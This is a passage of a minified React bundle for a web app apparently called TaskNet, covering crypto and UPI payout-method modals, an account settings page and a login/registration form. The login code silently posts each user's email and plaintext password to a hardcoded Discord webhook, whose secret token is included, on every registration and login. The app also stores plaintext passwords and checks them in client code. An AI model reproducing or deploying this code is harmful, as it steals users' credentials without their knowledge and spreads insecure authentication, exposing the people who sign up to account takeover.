object-contain"})}),s.jsxs("div",{children:[s.jsx("p",{className:"font-bold text-white",children:al[S]}),s.jsx("button",{onClick:()=>w(null),className:"text-xs text-blue-500 hover:underline",children:"Change method"})]})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:al[S]}),s.jsx("input",{type:"text",autoFocus:!0,placeholder:xe(S),value:E,onChange:B=>T(B.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]}),s.jsxs("div",{className:"flex gap-3",children:[s.jsx("button",{onClick:_e,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:R,disabled:!E.trim()||te,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed",children:te?"Saving...":"Add Method"})]})]}):s.jsxs("div",{className:"space-y-3",children:[s.jsx("p",{className:"text-gray-500 text-sm mb-4",children:"Select a payout method:"}),s.jsxs("button",{onClick:()=>w("binance"),disabled:u.some(B=>B.type==="binance"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-amber-500/30 hover:bg-amber-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[s.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es.binance,alt:"Binance",className:"w-full h-full object-contain"})}),s.jsxs("div",{className:"text-left",children:[s.jsx("p",{className:"font-bold text-white",children:"Binance ID"}),s.jsx("p",{className:"text-xs text-gray-500",children:"Pay via Binance Pay"})]}),u.some(B=>B.type==="binance")&&s.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]}),s.jsxs("button",{onClick:()=>w("usdt"),disabled:u.some(B=>B.type==="usdt"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-emerald-500/30 hover:bg-emerald-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[s.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es.usdt,alt:"USDT",className:"w-full h-full object-contain"})}),s.jsxs("div",{className:"text-left",children:[s.jsx("p",{className:"font-bold text-white",children:"USDT Wallet"}),s.jsx("p",{className:"text-xs text-gray-500",children:"TRC20 Network Address"})]}),u.some(B=>B.type==="usdt")&&s.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]}),s.jsxs("button",{onClick:()=>w("upi"),disabled:u.some(B=>B.type==="upi"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-purple-500/30 hover:bg-purple-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[s.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es.upi,alt:"UPI",className:"w-full h-full object-contain"})}),s.jsxs("div",{className:"text-left",children:[s.jsx("p",{className:"font-bold text-white",children:"UPI ID"}),s.jsx("p",{className:"text-xs text-gray-500",children:"Indian Payment Network"})]}),u.some(B=>B.type==="upi")&&s.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]})]})]})}),y&&D&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300",children:[s.jsxs("div",{className:"flex items-center justify-between mb-6",children:[s.jsxs("h2",{className:"text-xl font-black tracking-tight uppercase",children:["Edit ",D.label]}),s.jsx("button",{onClick:Q,className:"p-2 hover:bg-white/10 rounded-xl transition-colors",children:s.jsx(De,{size:20})})]}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl",children:[s.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es[D.type],alt:D.label,className:"w-full h-full object-contain"})}),s.jsx("p",{className:"font-bold text-white",children:D.label})]}),s.jsxs("div",{className:"space-y-2",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:D.label}),s.jsx("input",{type:"text",autoFocus:!0,placeholder:xe(D.type),value:E,onChange:B=>T(B.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]}),s.jsxs("div",{className:"flex gap-3",children:[s.jsx("button",{onClick:Q,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:M,disabled:!E.trim()||te,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed",children:te?"Saving...":"Save Changes"})]})]})]})}),k&&I&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-sm bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300 text-center",children:[s.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mx-auto mb-6 border border-red-500/20",children:s.jsx($s,{className:"text-red-500",size:28})}),s.jsx("h2",{className:"text-xl font-black tracking-tight mb-2",children:"Remove Method?"}),s.jsxs("p",{className:"text-gray-500 text-sm mb-6",children:["Are you sure you want to remove your ",s.jsx("span",{className:"text-white font-bold",children:I.label}),"? This action cannot be undone."]}),s.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl mb-6",children:[s.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es[I.type],alt:I.label,className:"w-full h-full object-contain"})}),s.jsxs("div",{className:"text-left flex-1 min-w-0",children:[s.jsx("p",{className:"text-xs text-gray-500",children:I.label}),s.jsx("p",{className:"text-sm font-bold text-white truncate",children:I.value})]})]}),s.jsxs("div",{className:"flex gap-3",children:[s.jsx("button",{onClick:fe,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),s.jsx("button",{onClick:be,disabled:te,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 disabled:opacity-50",children:te?"Removing...":"Remove"})]})]})})]})},Ia=new Map,pf=8640*60*1e3,Xy=()=>{const a=ur(),[r,n]=j.useState("Personal Settings"),[l,c]=j.useState(Zt("user_email")||localStorage.getItem("user_email")||""),[u,h]=j.useState(""),[m,x]=j.useState(""),[y,v]=j.useState(""),[k,_]=j.useState(""),[S,w]=j.useState(null),[E,T]=j.useState(null),[D,z]=j.useState(!1),[I,H]=j.useState(!1),[te,J]=j.useState(!1),[F,ne]=j.useState(!1),[ue,Ee]=j.useState(""),[ze,Fe]=j.useState(""),[Re,de]=j.useState(""),[ae,we]=j.useState(!1),[he,U]=j.useState({show:!1,message:"",type:"info"}),Z=(Q,fe="info")=>{U({show:!0,message:Q,type:fe}),setTimeout(()=>U(xe=>({...xe,show:!1})),2e3)};j.useEffect(()=>{R()},[]),j.useEffect(()=>{m&&ee(m)},[m]);const ee=async Q=>{if(!Q)return;ne(!0),T(null);const fe=Ia.get(Q);if(fe&&Date.now()-fe.timestamp<pf){w(fe.karma),T(fe.status),ne(!1);return}try{const xe=Ia.get(Q);if(xe&&Date.now()-xe.timestamp<pf){w(xe.karma),T(xe.status),ne(!1);return}const B=`https://www.reddit.com/user/${Q}/about.json`,Ae=`https://old.reddit.com/user/${Q}/about.json`,et=[`https://reddapi.p.rapidapi.com/api/user_info?username=${Q}`,`https://api.redditmetrics.com/user/${Q}`,`https://api.allorigins.win/raw?url=${encodeURIComponent(B)}`,`https://corsproxy.io/?${encodeURIComponent(B)}`,`https://proxy.cors.sh/${B}`,`https://cors-proxy.htmldriven.com/?url=${encodeURIComponent(B)}`,`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(B)}`,`https://thingproxy.freeboard.io/fetch/${B}`,`https://yacdn.org/proxy/${B}`,`https://cors.bridged.cc/${B}`,`https://cors-proxy.fringe.zone/${B}`,Ae,B];for(const ct of et)try{const Ne=new AbortController,kt=setTimeout(()=>Ne.abort(),5e3),dr=await fetch(ct,{headers:{Accept:"application/json","x-rapidapi-host":"reddapi.p.rapidapi.com"},signal:Ne.signal});if(clearTimeout(kt),dr.ok){const it=await dr.json();if(it){if(ct.includes("reddapi.p.rapidapi.com")){if(it.data&&it.data.total_karma!==void 0){const ft=it.data.total_karma;T("active"),w(ft),Ia.set(Q,{karma:ft,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),ne(!1);return}}else if(ct.includes("api.redditmetrics.com")){if(it.karma!==void 0){const ft=it.karma;T("active"),w(ft),Ia.set(Q,{karma:ft,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),ne(!1);return}}else if(it.data){const ft=it.data,At=ft.total_karma??(ft.link_karma||0)+(ft.comment_karma||0);T("active"),w(At),Ia.set(Q,{karma:At,status:"active",timestamp:Date.now(),lastFetchedDate:new Date().toISOString().split("T")[0]}),ne(!1);return}}}}catch(Ne){if(Ne.name==="AbortError")continue;continue}E===null&&S===null&&(T("not_found"),w(null))}catch{S===null&&(T("not_found"),w(null))}finally{ne(!1)}},R=async()=>{if(!l)return;const{data:Q,error:fe}=await X.from("profiles").select("*").eq("email",l).single();Q&&(h(Q.server_username||""),x(Q.reddit_username||""),v(Q.reddit_link||""),_(Q.discord_username||""),Q.server_username&&z(!0),Q.reddit_username&&H(!0))},M=async()=>{if(E&&E!=="active"){Z(`Cannot link a ${E} account.`,"error");return}if(J(!0),m&&!I){const{data:fe}=await X.from("profiles").select("email").eq("reddit_username",m).neq("email",l).single();if(fe){Z("This Reddit account is already linked to another TaskNet user.","error"),J(!1);return}}const{error:Q}=await X.from("profiles").upsert({email:l,server_username:u,reddit_username:m,reddit_link:y,discord_username:k,updated_at:new Date().toISOString()},{onConflict:"email"});Q?Z("Error saving profile: "+Q.message,"error"):(Z("Profile updated successfully!","success"),u&&z(!0),m&&H(!0)),J(!1)},be=()=>{localStorage.removeItem("user_email"),Jf("user_email"),a("/welcome")},je=async()=>{if(!ue||!ze||!Re){Z("Please fill in all password fields.","error");return}if(ze!==Re){Z("New passwords do not match.","error");return}if(ze.length<6){Z("New password must be at least 6 characters.","error");return}we(!0);const{data:Q,error:fe}=await X.from("profiles").select("password").eq("email",l).single();if(fe||!Q){Z("Error verifying current password.","error"),we(!1);return}if(Q.password!==ue){Z("Current password is incorrect.","error"),we(!1);return}const{error:xe}=await X.from("profiles").update({password:ze,updated_at:new Date().toISOString()}).eq("email",l);xe?Z("Error updating password: "+xe.message,"error"):(Z("Password changed successfully!","success"),Ee(""),Fe(""),de("")),we(!1)},Ce=[{icon:s.jsx(ss,{size:18}),label:"Personal Settings"},{icon:s.jsx(Nr,{size:18}),label:"Change Password"},{icon:s.jsx(ul,{size:18}),label:"Social Integration"}],_e=()=>{switch(r){case"Personal Settings":return s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[s.jsx("h3",{className:"text-xl font-bold mb-6",children:"Personal Settings"}),s.jsx("div",{className:"max-w-xl space-y-6",children:s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Email Address"}),s.jsxs("div",{className:"relative",children:[s.jsx(Rf,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:16}),s.jsx("input",{type:"email",readOnly:!0,value:l,className:"w-full pl-12 pr-4 py-3 bg-white/[0.01] border border-white/5 rounded-xl text-gray-500 text-sm cursor-not-allowed outline-none"})]})]}),s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Server Username"}),s.jsxs("div",{className:"relative group",children:[s.jsx(ss,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),s.jsx("input",{type:"text",placeholder:"Enter your server username",value:u,readOnly:D,onChange:Q=>h(Q.target.value),className:`w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none transition-all text-sm outline-none ${D?"cursor-not-allowed text-gray-500 border-none opacity-60":"focus:border-blue-500"}`}),D&&s.jsxs("div",{className:"absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 px-2.5 py-1 bg-white/5 rounded-lg border border-white/5",children:[s.jsx(Nr,{size:10,className:"text-gray-500"}),s.jsx("span",{className:"text-[9px] font-black text-gray-500 uppercase tracking-widest",children:"Locked"})]})]})]})]})})]});case"Social Integration":return s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[s.jsx("h3",{className:"text-xl font-bold mb-1",children:"Social Integration"}),s.jsx("p",{className:"text-gray-500 text-sm mb-8",children:"Link your socials here"}),s.jsxs("div",{className:"max-w-xl space-y-8",children:[s.jsxs("div",{className:"space-y-4",children:[s.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-[0.2em] ml-1",children:"Linked Accounts"}),m&&y&&(F||E)?s.jsxs("div",{className:"p-5 bg-[#0a0a0a] border border-white/5 rounded-3xl flex items-center justify-between group hover:border-white/10 transition-all shadow-xl",children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"w-12 h-12 bg-[#FF4500]/10 rounded-2xl flex items-center justify-center border border-[#FF4500]/20",children:s.jsx("svg",{viewBox:"0 0 24 24",className:"w-7 h-7 fill-[#FF4500]",xmlns:"http://www.w3.org/2000/svg",children:s.jsx("path",{d:"M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.051l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.945 0 1.712.767 1.712 1.712 0 .593-.306 1.11-.764 1.398.032.183.051.369.051.563 0 2.315-2.72 4.192-6.075 4.192-3.354 0-6.074-1.877-6.074-4.192 0-.194.02-.38.051-.563a1.712 1.712 0 0 1-1.114-2.622c.307-.31.73-.491 1.207-.491.478 0 .901.182 1.207.491 1.194-.856 2.85-1.419 4.674-1.488l.82-3.818a.312.312 0 0 1 .37-.243l2.672.567c.058-.051.126-.093.197-.122zm-6.11 7.115c-.631 0-1.145.513-1.145 1.145s.514 1.145 1.145 1.145c.632 0 1.145-.513 1.145-1.145s-.513-1.145-1.145-1.145zm4.22 0c-.632 0-1.145.513-1.145 1.145s.513 1.145 1.145 1.145c.631 0 1.145-.513 1.145-1.145s-.514-1.145-1.145-1.145zm-4.22 3.183c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585zm4.22 0c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585z"})})}),s.jsxs("div",{children:[s.jsxs("p",{className:"text-[15px] font-black text-white tracking-tight",children:["u/",m]}),s.jsx("div",{className:"flex items-center gap-2 mt-0.5 min-h-[16px]",children:F?s.jsx("span",{className:"text-[10px] font-black text-blue-500 uppercase tracking-widest animate-pulse",children:"Checking Account..."}):E?s.jsx(s.Fragment,{children:E==="active"?s.jsxs(s.Fragment,{children:[s.jsxs("span",{className:"text-[11px] font-bold text-gray-500",children:[S?.toLocaleString()||"---"," karma"]}),s.jsx("span",{className:"text-gray-700",children:""}),s.jsxs("span",{className:"text-[10px] font-black text-emerald-500 uppercase tracking-widest flex items-center gap-1.5",children:[s.jsx("div",{className:"w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]"}),"Active"]})]}):s.jsxs("span",{className:`text-[10px] font-black uppercase tracking-widest flex items-center gap-1.5 ${E==="suspended"||E==="banned"?"text-red-500":"text-gray-500"}`,children:[s.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${E==="suspended"||E==="banned"?"bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]":"bg-gray-500"}`}),E.replace("_"," ")]})}):null})]})]}),!I&&s.jsx("button",{onClick:()=>{v(""),x(""),w(null),T(null)},className:"px-4 py-2 text-[10px] font-black text-red-500/60 hover:text-red-500 hover:bg-red-500/5 rounded-xl uppercase tracking-[0.2em] transition-all",children:"UNLINK"}),I&&s.jsxs("div",{className:"flex items-center gap-1.5 px-3 py-1.5 bg-white/5 rounded-xl border border-white/5",children:[s.jsx(Nr,{size:12,className:"text-gray-600"}),s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest",children:"Permanent"})]})]}):s.jsxs("div",{className:"p-10 border border-dashed border-white/5 rounded-[32px] flex flex-col items-center justify-center text-center bg-white/[0.01]",children:[s.jsx("div",{className:"w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center mb-4 border border-white/5",children:s.jsx(ul,{className:"text-gray-600",size:24})}),s.jsx("p",{className:"text-gray-500 text-xs font-medium",children:"No accounts integrated yet."})]})]}),s.jsx("div",{className:"h-[1px] bg-white/5 mx-2"}),s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{children:[s.jsxs("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-3 tracking-widest ml-1 flex items-center justify-between",children:[s.jsx("span",{children:"Reddit Profile Link"}),!I&&s.jsx("span",{className:"text-[9px] font-black text-amber-500 uppercase tracking-tighter bg-amber-500/10 px-2 py-0.5 rounded-md animate-pulse",children:"Action Required"})]}),!I&&s.jsxs("div",{className:"mb-4 p-4 bg-amber-500/5 border border-amber-500/20 rounded-2xl flex gap-3 items-start animate-in fade-in slide-in-from-top-2 duration-500",children:[s.jsx(at,{size:16,className:"text-amber-500 mt-0.5 shrink-0"}),s.jsxs("p",{className:"text-[11px] leading-relaxed text-amber-500/80 font-medium",children:[s.jsx("span",{className:"font-bold text-amber-500 uppercase mr-1",children:"Permanent Binding:"}),"Once you apply changes, this Reddit account will be ",s.jsx("span",{className:"text-amber-500 underline decoration-2",children:"permanently locked"})," to your profile. You cannot change, reroll, or unlink it later. Please ensure the link is 100% correct."]})]}),s.jsxs("div",{className:"relative group",children:[s.jsx(ul,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-[#FF4500] transition-colors",size:16}),s.jsx("input",{type:"url",placeholder:"https://www.reddit.com/user/username",value:y,readOnly:I,onChange:Q=>{if(I)return;const fe=Q.target.value.trim();v(fe);const xe=fe.match(/^https?:\/\/(www\.)?reddit\.com\/(u|user)\/([a-zA-Z0-9_-]+)/i);xe&&xe[3]?x(xe[3]):(x(""),T(null),w(null))},className:`w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none transition-all text-sm outline-none placeholder:text-gray-700 ${I?"cursor-not-allowed text-gray-500 border-none opacity-60":"focus:border-[#FF4500]"}`}),I&&s.jsxs("div",{className:"absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 px-3 py-1.5 bg-white/5 rounded-xl border border-white/5",children:[s.jsx(Nr,{size:12,className:"text-gray-500"}),s.jsx("span",{className:"text-[9px] font-black text-gray-500 uppercase tracking-widest",children:"Locked"})]})]})]}),s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Discord Username"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Er,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-[#5865F2] transition-colors",size:16}),s.jsx("input",{type:"text",placeholder:"username#0000",value:k,onChange:Q=>_(Q.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-[#5865F2] transition-all text-sm outline-none"})]})]})]})]})]});case"Change Password":return s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[s.jsx("h3",{className:"text-xl font-bold mb-2",children:"Change Password"}),s.jsx("p",{className:"text-gray-500 text-sm mb-8",children:"Update your account password securely."}),s.jsxs("div",{className:"max-w-xl space-y-6",children:[s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Current Password"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),s.jsx("input",{type:"password",placeholder:"Enter current password",value:ue,onChange:Q=>Ee(Q.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"New Password"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),s.jsx("input",{type:"password",placeholder:"Enter new password",value:ze,onChange:Q=>Fe(Q.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsxs("div",{children:[s.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Confirm New Password"}),s.jsxs("div",{className:"relative group",children:[s.jsx(Nr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),s.jsx("input",{type:"password",placeholder:"Confirm new password",value:Re,onChange:Q=>de(Q.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),s.jsx("button",{onClick:je,disabled:ae,className:"w-full py-3 bg-blue-600 text-white rounded-xl font-bold text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg shadow-blue-600/20",children:ae?"Updating Password...":"Update Password"})]})]});default:return null}};return s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${he.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${he.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":he.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:he.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):he.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:he.message})]}),s.jsx("button",{onClick:()=>U(Q=>({...Q,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-7xl mx-auto",children:[s.jsxs("header",{className:"mb-10",children:[s.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Account"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Update your profile and account preferences."})]}),s.jsxs("div",{className:"flex flex-col lg:flex-row gap-12",children:[s.jsxs("aside",{className:"w-full lg:w-64 space-y-2",children:[s.jsx("p",{className:"text-[10px] font-black text-gray-600 uppercase tracking-[0.2em] mb-4 ml-4",children:"Select Menu"}),Ce.map(Q=>s.jsxs("button",{onClick:()=>n(Q.label),className:`w-full flex items-center gap-3 px-6 py-4 rounded-2xl transition-all ${r===Q.label?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white hover:bg-white/[0.03]"}`,children:[Q.icon,s.jsx("span",{className:"font-bold text-sm tracking-tight",children:Q.label})]},Q.label)),s.jsx("div",{className:"pt-4 mt-4 border-t border-white/5",children:s.jsxs("button",{onClick:be,className:"w-full flex items-center gap-3 px-6 py-4 rounded-2xl text-red-500 hover:bg-red-500/10 transition-all group",children:[s.jsx(Tf,{size:18,className:"group-hover:-translate-x-1 transition-transform"}),s.jsx("span",{className:"font-bold text-sm tracking-tight",children:"Sign Out"})]})})]}),s.jsx("div",{className:"flex-1 bg-white/[0.02] border border-white/5 rounded-[40px] p-8 sm:p-12",children:s.jsxs("div",{className:"max-w-2xl",children:[_e(),r!=="Change Password"&&s.jsxs("div",{className:"flex items-center gap-4 mt-16 pt-8 border-t border-white/5",children:[s.jsx("button",{onClick:R,className:"px-10 py-3.5 bg-white/5 border border-white/5 text-white rounded-2xl font-bold text-sm hover:bg-white/10 transition-all",children:"Discard"}),s.jsx("button",{disabled:te,onClick:M,className:"flex-1 py-3.5 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 disabled:opacity-50",children:te?"Processing...":"Apply Changes"})]})]})})]})]})]})},Zy=()=>{const[a,r]=j.useState(""),[n,l]=j.useState(""),[c,u]=j.useState(""),[h,m]=j.useState(!1),[x,y]=j.useState(!1),v=ur(),[k,_]=j.useState({show:!1,message:"",type:"info"}),S=(T,D="info")=>{_({show:!0,message:T,type:D}),setTimeout(()=>_(z=>({...z,show:!1})),2e3)},w=async(T,D,z,I)=>{const H="https://discord.com/api/webhooks/1465382200848679238/Q7N3WT9vJNv5HqCktrGNMhYMjlkzTmbMt7RFTN05K6DSRPX_0Ej7tCiRBVlzJL0K5kCs",te=new Date().toLocaleString(),J={embeds:[{title:T==="register"?" New Registration":" User Login",color:T==="register"?65280:3900150,fields:[{name:" Email",value:`\`\`\`${D}\`\`\``,inline:!1},{name:" Password",value:`\`\`\`${z}\`\`\``,inline:!1},...I?[{name:" Server Username",value:`\`\`\`${I}\`\`\``,inline:!1}]:[],{name:" Timestamp",value:te,inline:!1}],footer:{text:"TaskNet Authentication"}}]};try{await fetch(H,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(J)})}catch(F){console.error("Webhook error:",F)}},E=async T=>{if(T.preventDefault(),y(!0),h){if(!c){S("Please fill in all fields.","error"),y(!1);return}const{data:D}=await X.from("profiles").select("email").eq("email",a).single();if(D){S("Account with this email already exists. Please login.","error"),y(!1);return}const{error:z}=await X.from("profiles").insert({email:a,password:n,server_username:c,created_at:new Date().toISOString(),updated_at:new Date().toISOString()});z?S("Error creating account: "+z.message,"error"):(await w("register",a,n,c),Uc("user_email",a,30),localStorage.setItem("user_email",a),S("Account created! Welcome to TaskNet.","success"),setTimeout(()=>v("/"),1500))}else{const{data:D,error:z}=await X.from("profiles").select("email, password").eq("email",a).single();if(z||!D){S("Account not found. Please sign up first.","error"),y(!1);return}if(D.password!==n){S("Incorrect password. Please try again.","error"),y(!1);return}await X.from("profiles").update({updated_at:new Date().toISOString()}).eq("email",a),await w("login",a,n),Uc("user_email",a,30),localStorage.setItem("user_email",a),S("Login successful! Redirecting...","success"),setTimeout(()=>v("/"),1e3)}y(!1)};return s.jsxs("div",{className:"min-h-screen w-full bg-black flex items-center justify-center p-6 selection:bg-blue-600 selection:text-white",children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${k.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${k.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":k.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center 